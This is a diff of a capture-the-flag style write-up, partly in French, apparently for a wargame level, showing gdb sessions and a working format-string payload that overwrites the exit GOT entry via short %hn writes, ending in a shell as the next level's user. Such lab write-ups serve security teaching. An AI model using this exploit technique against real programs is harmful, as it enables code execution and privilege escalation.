@@ -79,16 +79,6 @@ $1 = 4294957074
 $2 = 0xffffd812  
 (gdb) x/s 0xffffd812  
   
-(gdb) p/d 0xd812  
-$4 = 55314  
-(gdb) p/d 0xd812-8  
-$5 = 55306  
-  
-gdb-peda$ p/d 0xffff  
-$5 = 65535  
-(gdb) p/d 0xffff-55314  
-$6 = 10221  
-  
 We get exit function address:
 
 ```gdb
@@ -105,12 +95,8 @@ Dump of assembler code for function exit@plt:
    0x08048376 <+6>:     push   $0x18
    0x0804837b <+11>:    jmp    0x8048330
 ```
-4294957047
-
-r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957047\$x + '%10\$n'")
-
-
-(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '%4294957070\$n'")
+  
+(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957070\$x + '%10\$n'")
 0x0804847a in main ()
 (gdb) x/wx $esp
 0xffffd690:     0xffffd6b8
@@ -129,19 +115,24 @@ https://cs155.stanford.edu/papers/formatstring-1.2.pdf
   
 Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite. 
   
+```bash
+(gdb) p/d 0xd812  
+$4 = 55314  
+(gdb) p/d 0xd812-8  
+$5 = 55306  
+  
+gdb-peda$ p/d 0xffff  
+$5 = 65535  
+(gdb) p/d 0xffff-55314  
+$6 = 10221  
+  
+```
+
 => 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100  
 (gdb) x/wx $esp  
 0xffffd470:     0xffffd498  
 (gdb) x/s 0xffffd498  
 0xffffd498:      ""  
-  
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05  
-<...>  
-whoami  
-level06  
-  
-Je pense qu il ny a pas assez de NOPs de disponible afin de pouvoir etre sur qu une adresse arrive dans les NOPs si on met notre shellcode dans l entree standard.  
-    
   
 (gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%.55306u%10\$hn' + '%.10221u%11\$hn'")  
 => 0x08048507 <+195>:   call   0x8048340 <printf@plt>
@@ -170,3 +161,8 @@ Dump of assembler code for function exit@got.plt:
    0x080497e2 <+2>:     (bad)  
    0x080497e3 <+3>:     jmp    DWORD PTR [eax]
 End of assembler dump.
+  
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05  
+<...>  
+whoami  
+level06  
